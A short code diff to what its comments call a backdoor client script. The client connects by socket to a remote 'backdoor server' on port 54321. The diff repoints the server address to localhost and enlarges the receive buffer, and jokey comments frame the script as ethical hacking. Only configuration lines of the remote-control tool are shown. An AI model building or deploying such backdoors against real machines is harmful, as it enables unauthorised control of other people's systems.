@@ -31,7 +31,8 @@ sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 # If you insist performing the captioned procedure, then
 # you'll be crossing the boundary of Ethical Hacking ;)
 # FBI is watching you :D
-IP_ADDRESS = '192.168.2.16'
+#IP_ADDRESS = '192.168.2.16'
+IP_ADDRESS = '127.0.0.1'
 # Your Cloud Backdoor Server should be running server.py all the time
 port = 54321
 
@@ -54,7 +55,8 @@ def reliable_recv():
     # Instead of just 1024 bytes
     while True:
         try:
-            json_data += sock.recv(1024)
+            #json_data += sock.recv(1024)
+            json_data += sock.recv(4096)
             # If target.recv <= 1024 bytes
             decoded_json = json.loads(json_data.decode())
             #return json.loads(json_data.decode())
